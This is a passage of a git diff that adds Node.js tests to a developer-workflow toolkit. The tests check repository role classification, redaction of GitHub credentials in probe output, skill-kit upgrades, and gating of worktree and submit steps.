@@ -10,14 +10,24 @@
  */
 
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
-import { tmpdir } from 'node:os'
-import { dirname, join, resolve } from 'node:path'
+import { homedir, tmpdir } from 'node:os'
+import { basename, dirname, join, resolve, sep } from 'node:path'
 import { fileURLToPath } from 'node:url'
 import { spawn, spawnSync } from 'node:child_process'
 
 const HERE = dirname(fileURLToPath(import.meta.url))
 const SCRIPTS = resolve(HERE, '..')
 const SKILL_ROOT = resolve(HERE, '..', '..')
+
+if (!String(process.env.PF_BACKUP_DIR ?? '').trim()) {
+  const testBackupRoot = mkdtempSync(join(tmpdir(), 'pf-test-bk-'))
+  process.env.PF_BACKUP_DIR = testBackupRoot
+  process.on('exit', () => {
+    try {
+      rmSync(testBackupRoot, { recursive: true, force: true, maxRetries: 5, retryDelay: 50 })
+    } catch { /* 留给系统清理 */ }
+  })
+}
 
 let passed = 0
 const failures = []
@@ -67,9 +77,9 @@ function gitInit(dir) {
   spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'commit', '-qm', 'init'], opts)
 }
 
-async function survey(dir) {
+async function survey(dir, opts) {
   const { survey: run } = await import('../survey.mjs')
-  return run(dir)
+  return run(dir, opts)
 }
 
 /**
@@ -173,19 +183,19 @@ cases.push(['isRepoRoot 为假时停下并问边界', async () => {
   } finally { rmTree(outer) }
 }])
 
-cases.push(['没有远端时角色是 maintainer（本地提交不涉及别人）', async () => {
+cases.push(['没有远端时角色是 local-only（按纯本地工作区处置，不误判为维护者）', async () => {
   const dir = tmpProject({ 'README.md': '# a\n' })
   gitInit(dir)
   try {
     const f = await survey(dir)
-    if (f.git.role !== 'maintainer') return `role=${f.git.role}`
+    if (f.git.role !== 'local-only') return `role=${f.git.role}`
     return true
   } finally { rmTree(dir) }
 }])
 
-cases.push(['有远端但没声明源仓库时角色是 undetermined', async () => {
+cases.push(['有远端、无提交历史且没声明源仓库时角色是 undetermined', async () => {
   const dir = tmpProject({ 'README.md': '# a\n' })
-  gitInit(dir)
+  spawnSync('git', ['init', '-q'], { cwd: dir, stdio: 'ignore' })
   spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/x/y.git'], { cwd: dir, stdio: 'ignore' })
   try {
     const f = await survey(dir)
@@ -1382,22 +1392,24 @@ cases.push(['子目录里的独立仓库会被点名，并给出边界问题', a
   } finally { rmTree(dir) }
 }])
 
-cases.push(['清单声明了源仓库，角色就判得出来；没声明时提问而不是猜', async () => {
+cases.push(['清单声明了源仓库且作者匹配，角色就判得出来；没声明且无历史时提问而不是猜', async () => {
   const declared = tmpProject({
     'README.md': '# d\n\n说明足够长。\n',
     'pyproject.toml': '[project]\nname = "api"\nversion = "1.0.0"\n\n[project.urls]\nRepository = "https://github.com/acme/api"\n',
   })
   try {
     gitInit(declared)
+    spawnSync('git', ['config', 'user.name', 't'], { cwd: declared, stdio: 'ignore' })
+    spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: declared, stdio: 'ignore' })
     spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/acme/api.git'], { cwd: declared, stdio: 'ignore' })
     const f = await survey(declared)
     if (f.ecosystem.declaredRepo !== 'acme/api') return `declaredRepo=${f.ecosystem.declaredRepo}`
-    if (f.git.role !== 'maintainer') return `role=${f.git.role}（声明与 origin 一致，本该是维护者）`
+    if (f.git.role !== 'maintainer') return `role=${f.git.role}（声明与 origin 一致且提交作者一致，本该是维护者）`
 
-    // 反面：没声明时不许猜成维护者，而且要把问题问出来。
+    // 反面：没声明且无提交作者/写权限证据时，不许猜成维护者，而且要把问题问出来。
     const undeclared = tmpProject({ 'README.md': '# d\n\n说明足够长。\n', 'main.py': 'print(1)\n' })
     try {
-      gitInit(undeclared)
+      spawnSync('git', ['init', '-q'], { cwd: undeclared, stdio: 'ignore' })
       spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/acme/unknown.git'], { cwd: undeclared, stdio: 'ignore' })
       const g = await survey(undeclared)
       if (g.git.role !== 'undetermined') return `role=${g.git.role}（没声明源仓库却判成了别的）`
@@ -2047,6 +2059,15 @@ cases.push(['收尾章：内容下限抓得住「三处一起漏」', async () =
     return '删掉「删之前先问」之后没有报缺'
   }
 
+  // 反面三之二（回归防线）：即使七步正文里出现了 worktree、本地分支、远端分支、回读确认，
+  // 删掉独立散文段仍必须报缺——七步本身不能自凑齐 ask-before-delete。
+  const stepsHaveKeywords = full
+    .replace('`git branch -d <分支>`；', '再删本地分支 `git branch -d <分支>`；')
+    .replace('  **第 5 步之前先把要删的清单列出来问一次**：哪个 worktree、哪条本地分支、哪条远端分支。\n', '')
+  if (!finishRequiredMissing(stepsHaveKeywords).some((l) => l.includes('问一次'))) {
+    return '七步里凑齐了四个词但独立问询段被删，ask-before-delete 却放行了（假阴性漏检复发）'
+  }
+
   // 反面四：**同一章里别处的正常用法不能算交代**——
   // 「产物清单」「卸之前先问人」「弱化门禁要人点头」都在这一章里，但都不是这条要求。
   const decoys = full.replace(
@@ -2267,14 +2288,2319 @@ cases.push(['本仓库：正文里没有节号指针', async () => {
   return true
 }])
 
-for (const [name, fn] of cases) {
+// ── v5 升级行为断言（C1..C11 正反双向） ───────────────────────────────
+
+function runAbs(scriptRel, args, opts = {}) {
+  return spawnSync(process.execPath, [join(SKILL_ROOT, scriptRel), ...args], {
+    encoding: 'utf8',
+    timeout: 60000,
+    ...opts,
+  })
+}
+
+cases.push(['五态身份：clone-readonly 防误判、自有缺 repository 判 maintainer、fork 与 undetermined 正反双向', async () => {
+  const { classifyWorkspaceIdentity } = await import('../lib/platform/github.mjs')
+
+  // 1. local-only：.git/pf-local-mode 强制本地模式（哪怕有远端）
+  const localMode = classifyWorkspaceIdentity({
+    gitFacts: { present: true, remote: 'https://github.com/other/repo.git', remoteUrls: { origin: 'https://github.com/other/repo.git' } },
+    localMode: true,
+  })
+  if (localMode.role !== 'local-only') return `pf-local-mode 未判成 local-only：${localMode.role}`
+
+  // 2. 反误判（核心）：clone 他人公开仓（即使 repository === origin），无写权限且历史作者非本机 -> clone-readonly，严禁判成 maintainer
+  const clonedOther = classifyWorkspaceIdentity({
+    gitFacts: {
+      present: true,
+      remote: 'https://github.com/other/demo.git',
+      remoteUrls: { origin: 'https://github.com/other/demo.git' },
+      commitCount: 5,
+      historyAuthors: ['Origin Author <author@other.example>'],
+      userName: 'Local User',
+      userEmail: 'local@example.com',
+    },
+    declaredRepo: 'other/demo',
+  })
+  if (clonedOther.role !== 'clone-readonly') return `他人公开仓被误判成 ${clonedOther.role}`
+
+  // 3. API 明确只读权限（即使历史或声明有误导）-> clone-readonly
+  const apiReadOnly = classifyWorkspaceIdentity({
+    gitFacts: {
+      present: true,
+      remote: 'https://github.com/org/lib.git',
+      remoteUrls: { origin: 'https://github.com/org/lib.git' },
+      commitCount: 1,
+      historyAuthors: ['Me <me@example.com>'],
+      userName: 'Me',
+      userEmail: 'me@example.com',
+    },
+    declaredRepo: 'org/lib',
+    probeApi: { canPush: false, viewerPermission: 'READ', login: 'outsider' },
+  })
+  if (apiReadOnly.role !== 'clone-readonly') return `只读 API 权限被判成 ${apiReadOnly.role}`
+
+  // 4. 自有缺 declaredRepo 项目（本机身份匹配 origin owner 或全部提交作者匹配）-> maintainer
+  const ownNoDecl = classifyWorkspaceIdentity({
+    gitFacts: {
+      present: true,
+      remote: 'https://github.com/myuser/my-app.git',
+      remoteUrls: { origin: 'https://github.com/myuser/my-app.git' },
+      commitCount: 2,
+      historyAuthors: ['myuser <myuser@users.noreply.github.com>'],
+      userName: 'myuser',
+      userEmail: 'myuser@users.noreply.github.com',
+    },
+  })
+  if (ownNoDecl.role !== 'maintainer') return `自有缺 declaredRepo 仓未判成 maintainer：${ownNoDecl.role}`
+
+  // 5. contributor-fork（有不同 upstream 且非只读）；反面：只读克隆他人 fork -> clone-readonly
+  const forkOwn = classifyWorkspaceIdentity({
+    gitFacts: {
+      present: true,
+      remote: 'https://github.com/me/app.git',
+      remoteUrls: { origin: 'https://github.com/me/app.git', upstream: 'https://github.com/upstream/app.git' },
+    },
+    probeApi: { canPush: true, viewerPermission: 'WRITE', login: 'me' },
+  })
+  if (forkOwn.role !== 'contributor-fork') return `upstream 不同未判成 contributor-fork：${forkOwn.role}`
+
+  const forkReadOnly = classifyWorkspaceIdentity({
+    gitFacts: {
+      present: true,
+      remote: 'https://github.com/someone/app.git',
+      remoteUrls: { origin: 'https://github.com/someone/app.git', upstream: 'https://github.com/upstream/app.git' },
+    },
+    probeApi: { canPush: false, viewerPermission: 'READ', login: 'me' },
+  })
+  if (forkReadOnly.role !== 'clone-readonly') return `只读他人 fork 被判成 ${forkReadOnly.role}`
+
+  return true
+}])
+
+cases.push(['双轨凭据：SSH 可用不误报缺凭据、protocolMismatch 给出切换命令、Token 绝不泄露到序列化输出', async () => {
+  const { probeGitHubEnv } = await import('../lib/platform/github.mjs')
+
+  // 正面：SSH remote + ssh -T 成功 + HTTPS credential fill 返回空 -> ssh available，protocolMismatch=false，不误报
+  const sshRunner = async (cmd, args) => {
+    if (cmd === 'ssh') return { ok: true, code: 1, stdout: '', stderr: 'Hi octocat! You\'ve successfully authenticated, but GitHub does not provide shell access.' }
+    if (cmd === 'git' && args[0] === 'credential') return { ok: false, code: 1, stdout: '', stderr: '' }
+    if (cmd === 'git') return { ok: false, code: 1, stdout: '', stderr: '' }
+    return { ok: false, code: 1, stdout: '', stderr: '', missing: true }
+  }
+  const sshRes = await probeGitHubEnv({
+    remoteUrls: { origin: 'git@github.com:octocat/demo.git' },
+    runner: sshRunner,
+    env: {},
+  })
+  if (sshRes.ssh.state !== 'available' || sshRes.ssh.login !== 'octocat') {
+    return `SSH 探测失败：${JSON.stringify(sshRes.ssh)}`
+  }
+  if (sshRes.protocolMismatch !== false) return `SSH 正常却报 protocolMismatch：${JSON.stringify(sshRes)}`
+  if (sshRes.https.state === 'available') return '空 credential fill 不应判 HTTPS available'
+
+  // 正面：HTTPS remote 无凭据但 SSH 可用 -> protocolMismatch=true 且给出 set-url 切换到 git@github.com 命令
+  const mismatchRes = await probeGitHubEnv({
+    remoteUrls: { origin: 'https://github.com/octocat/demo.git' },
+    runner: sshRunner,
+    env: {},
+  })
+  if (mismatchRes.protocolMismatch !== true || !String(mismatchRes.remediationCmd).includes('git@github.com:octocat/demo.git')) {
+    return `protocolMismatch 提示不对：${JSON.stringify(mismatchRes)}`
+  }
+
+  // 安全脱敏：环境变量 GH_TOKEN 与 credential fill 返回的密码绝不出现在 JSON 序列化结果中
+  const secretA = 'ghp_TestSecretTokenAlpha987654'
+  const secretB = 'gho_CredentialHelperBeta123456'
+  const tokenRunner = async (cmd, args) => {
+    if (cmd === 'git' && args[0] === 'credential') {
+      return { ok: true, code: 0, stdout: `protocol=https\nhost=github.com\nusername=octocat\npassword=${secretB}\n`, stderr: '' }
+    }
+    return { ok: false, code: 1, stdout: '', stderr: '', missing: true }
+  }
+  const tokRes = await probeGitHubEnv({
+    remoteUrls: { origin: 'https://github.com/octocat/demo.git' },
+    runner: tokenRunner,
+    env: { GH_TOKEN: secretA },
+  })
+  const dumped = JSON.stringify(tokRes)
+  if (dumped.includes(secretA) || dumped.includes(secretB)) return 'probeGitHubEnv 返回结果泄露了明文 token'
+  if (tokRes.https.hasToken !== true || tokRes.https.username !== 'octocat') return `脱敏字段异常：${dumped}`
+
+  // 真实子进程探测 survey --probe-auth --json 不得泄露 GH_TOKEN
+  const dir = tmpProject({ 'README.md': '# demo\n' })
+  try {
+    gitInit(dir)
+    const sub = await runNode('survey.mjs', [dir, '--probe-auth'])
+    const subEnvRun = spawnSync(process.execPath, [join(SCRIPTS, 'survey.mjs'), dir, '--probe-auth'], {
+      encoding: 'utf8',
+      timeout: 30000,
+      env: { ...process.env, GH_TOKEN: secretA, GITHUB_TOKEN: secretB },
+    })
+    if (subEnvRun.status !== 0) return `survey --probe-auth 退出异常：${subEnvRun.status}`
+    if ((subEnvRun.stdout + subEnvRun.stderr).includes(secretA) || (subEnvRun.stdout + subEnvRun.stderr).includes(secretB)) {
+      return 'survey --probe-auth 子进程输出泄露了环境变量 token'
+    }
+    if (sub.status !== 0) return `survey 退出 ${sub.status}`
+  } finally { rmTree(dir) }
+
+  return true
+}])
+
+cases.push(['equip.mjs：首次装备、幂等、三态升级与退役删除、用户魔改/自定义保留、--bootstrap-empty 正反双向', async () => {
+  const target = tmpProject({ 'README.md': '# demo\n\n工程套件测试仓。\n' })
+  const kitV1 = tmpProject({
+    'lib/shared.mjs': 'export const VER = 1\n',
+    'dev-flow/SKILL.md': '---\nname: dev-flow\ndescription: v1\n---\n# v1\n',
+    'old-retired/legacy.md': '# obsolete\n',
+  })
+  const kitV2 = tmpProject({
+    'lib/shared.mjs': 'export const VER = 2\n',
+    'dev-flow/SKILL.md': '---\nname: dev-flow\ndescription: v2\n---\n# v2\n',
+  })
+  const emptyBoot = mkdtempSync(join(tmpdir(), 'pf-boot-'))
+
+  try {
+    // 1. 默认官方套件首次装备 + --check + 幂等
+    const e1 = runAbs('scripts/equip.mjs', [target])
+    if (e1.status !== 0) return `首次 equip 失败：${e1.stderr}`
+    const chk0 = runAbs('scripts/equip.mjs', [target, '--check'])
+    if (chk0.status !== 0) return `equip 后 --check 未通过：${chk0.stderr}`
+    const e2 = runAbs('scripts/equip.mjs', [target])
+    if (e2.status !== 0) return `第二次 equip 失败：${e2.stderr}`
+    const p2 = JSON.parse(e2.stdout).equip
+    if (p2.added.length !== 0 || p2.upgraded.length !== 0 || p2.conflicts.length !== 0 || p2.retired.length !== 0) {
+      return `equip 不幂等：${JSON.stringify(p2)}`
+    }
+
+    // 2. 用户魔改 + 自定义 Skill -> --check 必须红，v1->v2 升级保留魔改与自定义，自动升级未改文件并物理删除退役文件
+    const targetTri = tmpProject({ 'README.md': '# tri\n' })
+    try {
+      const i1 = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1])
+      if (i1.status !== 0) return `v1 装备失败：${i1.stderr}`
+      // 用户修改 dev-flow/SKILL.md 且保留 old-retired/legacy.md 未改；另建用户自定义 Skill
+      const customSkill = join(targetTri, '.agents', 'skills', 'my-custom', 'SKILL.md')
+      mkdirSync(dirname(customSkill), { recursive: true })
+      writeFileSync(customSkill, '# user custom skill\n')
+      const devFlowPath = join(targetTri, '.agents', 'skills', 'dev-flow', 'SKILL.md')
+      writeFileSync(devFlowPath, '# user hacked dev-flow\n')
+
+      const dirtyChk = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1, '--check'])
+      if (dirtyChk.status === 0) return '用户改动托管文件后 --check 却返回 0'
+
+      const up = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV2])
+      if (up.status !== 0) return `v2 升级失败：${up.stderr}`
+      const res = JSON.parse(up.stdout).equip
+      if (!res.upgraded.includes('lib/shared.mjs')) return `未改旧文件没自动升级：${JSON.stringify(res)}`
+      if (!res.conflicts.some((c) => c.path === 'dev-flow/SKILL.md')) return `用户魔改文件没进 conflicts 保护：${JSON.stringify(res)}`
+      if (!res.retired.includes('old-retired/legacy.md')) return `未改退役文件没进 retired：${JSON.stringify(res)}`
+      if (existsSync(join(targetTri, '.agents', 'skills', 'old-retired', 'legacy.md'))) return '退役文件未被物理删除'
+      if (readFileSync(devFlowPath, 'utf8') !== '# user hacked dev-flow\n') return '用户魔改内容被覆盖'
+      if (!existsSync(customSkill) || readFileSync(customSkill, 'utf8') !== '# user custom skill\n') {
+        return '用户自定义 Skill 被误删或覆盖'
+      }
+    } finally { rmTree(targetTri) }
+
+    // 3. --bootstrap-empty 正反双向
+    const boot = runAbs('scripts/equip.mjs', [emptyBoot, '--bootstrap-empty', '--lang', 'node', '--name', 'demo-boot'])
+    if (boot.status !== 0) return `空目录 --bootstrap-empty 失败：${boot.stderr}`
+    for (const rel of ['package.json', 'src/index.mjs', 'test/smoke.test.mjs', 'docs/TDD.md', '.agents/skills/.pf-manifest.json']) {
+      if (!existsSync(join(emptyBoot, rel))) return `bootstrap-empty 缺文件：${rel}`
+    }
+    const smokeRun = spawnSync(process.execPath, ['--test'], { cwd: emptyBoot, encoding: 'utf8', timeout: 30000 })
+    if (smokeRun.status !== 0) return `bootstrap-empty 生成的测试没跑绿：${smokeRun.stderr || smokeRun.stdout}`
+
+    // 反面：非空目录禁止 --bootstrap-empty
+    const bootNonEmpty = runAbs('scripts/equip.mjs', [target, '--bootstrap-empty', '--lang', 'node'])
+    if (bootNonEmpty.status === 0) return '非空目录却允许 --bootstrap-empty'
+
+    return true
+  } finally {
+    rmTree(target)
+    rmTree(kitV1)
+    rmTree(kitV2)
+    rmTree(emptyBoot)
+  }
+}])
+
+cases.push(['compose-agents.mjs：超 30KB 硬阻断、未标 customized 但 SHA256 变化时保护不覆盖', async () => {
+  const dir = tmpProject({
+    'package.json': '{"name":"cap-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
+    'README.md': '# cap-demo\n\n体积限制与基线保护测试仓。\n',
+  })
+  gitInit(dir)
+  try {
+    const eq = runAbs('scripts/equip.mjs', [dir])
+    if (eq.status !== 0) return `equip 失败：${eq.stderr}`
+    const g1 = runAbs('scripts/compose-agents.mjs', [dir])
+    if (g1.status !== 0) return `compose-agents 首次生成失败：${g1.stderr}`
+
+    const agentsFile = join(dir, 'AGENTS.md')
+    const original = readFileSync(agentsFile, 'utf8')
+
+    // 1. 保护未标 customized 但已被手工改动且偏离模板的区间（修改「版本与发布」段落而不加 customized）
+    const edited = original.replace('**提交纪律**：', '**提交纪律（手工微调）**：')
+    if (edited === original) return '测试前置替换未命中 AGENTS.md 版本与发布段'
+    writeFileSync(agentsFile, edited, 'utf8')
+
+    // 当「版本与发布」与模板不一致且与 .pf-manifest.json 基线 SHA256 不同时，必须保护跳过并保留手工内容
+    const g2 = runAbs('scripts/compose-agents.mjs', [dir])
+    if (g2.status !== 0) return `保护场景刷新失败：${g2.stderr}`
+    if (!/保护跳过/.test(g2.stderr || '') || !readFileSync(agentsFile, 'utf8').includes('手工微调')) {
+      return `未标 customized 的手工改动没有被保护跳过：stderr=${g2.stderr}`
+    }
+
+    // 2. 反面：AGENTS.md 超 30KB 时刷新必须退出 1 阻断写入
+    const oversized = `${original}\n\n## 补充说明\n\n${'x'.repeat(32000)}\n`
+    writeFileSync(agentsFile, oversized, 'utf8')
+    const g3 = runAbs('scripts/compose-agents.mjs', [dir])
+    if (g3.status === 0) return 'AGENTS.md 超过 30720 字节时 compose-agents 没有报错阻断'
+    if (!readFileSync(agentsFile, 'utf8').includes('## 补充说明')) return '超限阻断时改动了原文件'
+
+    return true
+  } finally { rmTree(dir) }
+}])
+
+cases.push(['worktree-deps.mjs：锁文件一致挂载共享依赖、安全解绑不删穿主仓、锁文件变化自动隔离', async () => {
+  const dir = tmpProject({
+    '.gitignore': 'node_modules/\n.worktrees/\n',
+    'package.json': '{"name":"deps-demo","version":"1.0.0"}\n',
+    'package-lock.json': '{"name":"deps-demo","lockfileVersion":3}\n',
+    'README.md': '# deps\n',
+  })
+  gitInit(dir)
+  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
+  const mainPkgFile = join(dir, 'node_modules', 'fake-pkg', 'index.js')
+  mkdirSync(dirname(mainPkgFile), { recursive: true })
+  writeFileSync(mainPkgFile, 'module.exports = { ok: true }\n')
+
+  const wt = join(dir, '.worktrees', 'impl-deps')
+  try {
+    const addWt = spawnSync('git', ['worktree', 'add', wt, '-b', 'feat/deps-test'], { cwd: dir, encoding: 'utf8' })
+    if (addWt.status !== 0) return `创建 worktree 失败：${addWt.stderr}`
+
+    // 正面：锁文件一致 -> mount 挂载并可读
+    const m1 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
+    if (m1.status !== 0) return `mount 失败：${m1.stderr}`
+    const wtPkgFile = join(wt, 'node_modules', 'fake-pkg', 'index.js')
+    if (!existsSync(wtPkgFile) || !readFileSync(wtPkgFile, 'utf8').includes('ok: true')) {
+      return 'mount 后无法通过 worktree 读取共享 node_modules'
+    }
+
+    // 正面：unmount 安全解绑后主仓 node_modules 完好无损
+    const u1 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt, '--json'])
+    if (u1.status !== 0) return `unmount 失败：${u1.stderr}`
+    if (existsSync(join(wt, 'node_modules'))) return 'unmount 后 worktree node_modules 依然存在'
+    if (!existsSync(mainPkgFile) || !readFileSync(mainPkgFile, 'utf8').includes('ok: true')) {
+      return 'unmount 删穿了主仓 node_modules'
+    }
+
+    // 反面：worktree 锁文件变化 -> 拒绝挂载，自动隔离
+    writeFileSync(join(wt, 'package-lock.json'), '{"name":"deps-demo","lockfileVersion":3,"changed":true}\n')
+    const m2 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
+    if (m2.status !== 0) return `锁文件不一致时 mount 应安全跳过而非崩溃：${m2.stderr}`
+    const m2Json = JSON.parse(m2.stdout)
+    if (m2Json.mode !== 'isolated' || m2Json.reason !== 'lockfile-changed' || (m2Json.mismatches?.length ?? 0) === 0 || m2Json.mounted.length !== 0 || existsSync(join(wt, 'node_modules'))) {
+      return `锁文件变化后未自动隔离：${m2.stdout}`
+    }
+
+    return true
+  } finally {
+    try { runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt]) } catch {}
+    spawnSync('git', ['worktree', 'remove', '--force', wt], { cwd: dir, stdio: 'ignore' })
+    rmTree(dir)
+  }
+}])
+
+cases.push(['flow.mjs + doc-plan.mjs：五档分流、Issue+PR 复用与依赖图、finalize/verify/submit 硬锁、fork 禁止合并与删前锁定', async () => {
+  const { triageTask } = await import('../../kit/skills/dev-plan/scripts/doc-plan.mjs')
+  const { analyzeIssueDependencies } = await import('../../kit/skills/dev-flow/scripts/flow.mjs')
+
+  // 1. 五档分流全覆盖（Case 1..5）
+  if (triageTask({ summary: '修正 README 错别字', files: 1 }).caseType !== 1) return 'Case 1 分流误判'
+  if (triageTask({ summary: 'fix parser crash on empty input', files: 1, bugfix: true }).caseType !== 2) return 'Case 2 分流误判'
+  if (triageTask({ summary: 'feat: add CSV output flag', files: 2 }).caseType !== 3) return 'Case 3 分流误判'
+  if (triageTask({ summary: '跨模块接口变更', touchesContract: true }).caseType !== 4) return 'Case 4 分流误判'
+  const c5 = triageTask({ summary: '推翻 TDD 架构重新设计核心引擎', conflictsTdd: true })
+  if (c5.caseType !== 5 || c5.blocked !== true) return `Case 5 未阻断：${JSON.stringify(c5)}`
+
+  // 2. 多 Issue 依赖边与环检测
+  const graphOk = analyzeIssueDependencies([
+    { number: 1, relations: { dependsOn: [], blocks: [] } },
+    { number: 2, relations: { dependsOn: [1], blocks: [3] } },
+    { number: 3, relations: { dependsOn: [], blocks: [] } },
+  ])
+  if (graphOk.hasCycle || graphOk.edges.length < 2 || graphOk.orderedIssues[0] !== 1 || graphOk.orderedIssues[2] !== 3) {
+    return `依赖拓扑解析失败：${JSON.stringify(graphOk)}`
+  }
+  const graphCycle = analyzeIssueDependencies([
+    { number: 10, relations: { dependsOn: [11], blocks: [] } },
+    { number: 11, relations: { dependsOn: [10], blocks: [] } },
+  ])
+  if (!graphCycle.hasCycle) return '环形 Issue 依赖未检出'
+
+  // 3. 真实本地工作流：Case 3 start -> Todo 未勾选阻断 finalize -> 未 finalize 阻断 submit -> 代码改动使 verifiedHead 失效 -> submit 成功
+  const localDir = tmpProject({
+    '.gitignore': '.worktrees/\n',
+    'package.json': '{"name":"flow-local","version":"1.0.0"}\n',
+    'README.md': '# flow-local\n',
+    'docs/TDD.md': '# TDD\n',
+    'src/app.mjs': 'export const n = 1\n',
+  })
+  gitInit(localDir)
+  spawnSync('git', ['branch', '-M', 'main'], { cwd: localDir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.name', 't'], { cwd: localDir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: localDir, stdio: 'ignore' })
+
+  try {
+    const start1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-flow', '--case', '3', '--slug', 'demo-feat', '--json'], { cwd: localDir })
+    if (start1.status !== 0) return `flow start 失败：${start1.stderr}`
+    const ledger1 = JSON.parse(start1.stdout)
+    const wtRoot = join(localDir, ledger1.worktreePath)
+
+    // 建未勾选 Todo -> finalize 必须失败
+    const todoInit = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['init', '--type', 'todo', '--slug', 'demo-feat', '--title', '测试任务', '--task', 't-flow', '--json'], { cwd: wtRoot })
+    if (todoInit.status !== 0) return `doc-plan init todo 失败：${todoInit.stderr}`
+    const todoInfo = JSON.parse(todoInit.stdout)
+
+    const finBlocked = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
+    if (finBlocked.status === 0) return 'Todo 仍有未勾选条目，finalize 却放行了'
+
+    // 勾选 Todo 并提交；故意不运行 finalize，先 verify 再 submit -> submit 必须返回 3（BLOCKED_NOT_FINALIZED）
+    const todoAbs = join(wtRoot, todoInfo.file)
+    writeFileSync(todoAbs, readFileSync(todoAbs, 'utf8').replace(/- \[ \]/g, '- [x]'))
+    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'check todo'], { cwd: wtRoot, stdio: 'ignore' })
+
+    const v1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
+    if (v1.status !== 0) return `verify 失败：${v1.stderr}`
+    const subNoFin = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
+    if (subNoFin.status !== 3 || !/BLOCKED_NOT_FINALIZED/.test(subNoFin.stderr)) {
+      return `未 finalize 时 submit 未拦截：exit=${subNoFin.status} stderr=${subNoFin.stderr}`
+    }
+
+    // finalize 后再改非文档代码并提交，使 verifiedHead !== HEAD -> submit 必须拦截
+    const finOk = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
+    if (finOk.status !== 0) return `finalize 失败：${finOk.stderr}`
+    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'archive todo'], { cwd: wtRoot, stdio: 'ignore' })
+
+    writeFileSync(join(wtRoot, 'src/app.mjs'), 'export const n = 2\n')
+    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
+    spawnSync('git', ['commit', '-qm', 'code change after verify'], { cwd: wtRoot, stdio: 'ignore' })
+    const subStale = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
+    if (subStale.status !== 3) return `代码变更后 verifiedHead 失效未拦截 submit：exit=${subStale.status} stderr=${subStale.stderr}`
+
+    // 重跑 finalize + verify -> submit 放行退出 0
+    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
+    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
+    const subOk = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
+    if (subOk.status !== 0) return `本地完整校验后 submit 失败：exit=${subOk.status} stderr=${subOk.stderr}`
+  } finally {
+    const wtCleanup = join(localDir, '.worktrees', 'impl-t-flow')
+    spawnSync('git', ['worktree', 'remove', '--force', wtCleanup], { cwd: localDir, stdio: 'ignore' })
+    rmTree(localDir)
+  }
+
+  // 4. inspect 识别已有 Issue+PR 复用；contributor-fork 禁止 merge 与 OPEN PR 禁止 cleanup
+  const forkDir = tmpProject({
+    '.gitignore': '.worktrees/\n',
+    'package.json': '{"name":"fork-demo","version":"1.0.0"}\n',
+    'README.md': '# fork-demo\n',
+  })
+  gitInit(forkDir)
+  spawnSync('git', ['branch', '-M', 'main'], { cwd: forkDir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.name', 'me'], { cwd: forkDir, stdio: 'ignore' })
+  spawnSync('git', ['config', 'user.email', 'me@example.com'], { cwd: forkDir, stdio: 'ignore' })
+  spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/me/fork-demo.git'], { cwd: forkDir, stdio: 'ignore' })
+  spawnSync('git', ['remote', 'add', 'upstream', 'https://github.com/upstream/fork-demo.git'], { cwd: forkDir, stdio: 'ignore' })
+
+  try {
+    const insp = runAbs('kit/skills/dev-flow/scripts/flow.mjs', [
+      'inspect', 'https://github.com/upstream/fork-demo/issues/12', 'https://github.com/upstream/fork-demo/pull/34', '--json',
+    ], { cwd: forkDir })
+    if (insp.status !== 0) return `inspect 失败：${insp.stderr}`
+    const inspJson = JSON.parse(insp.stdout)
+    if (inspJson.identity.role !== 'contributor-fork') return `fork 角色错误：${inspJson.identity.role}`
+    if (!inspJson.inputs?.reuseExistingPr || inspJson.inputs.reuseExistingPr.prNumber !== 34) {
+      return `inspect 未输出已有 PR 复用提示：${JSON.stringify(inspJson.inputs)}`
+    }
+
+    const fStart = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-fork', '--case', '1', '--slug', 'fix-doc', '--pr', '34', '--json'], { cwd: forkDir })
+    if (fStart.status !== 0) return `fork start 失败：${fStart.stderr}`
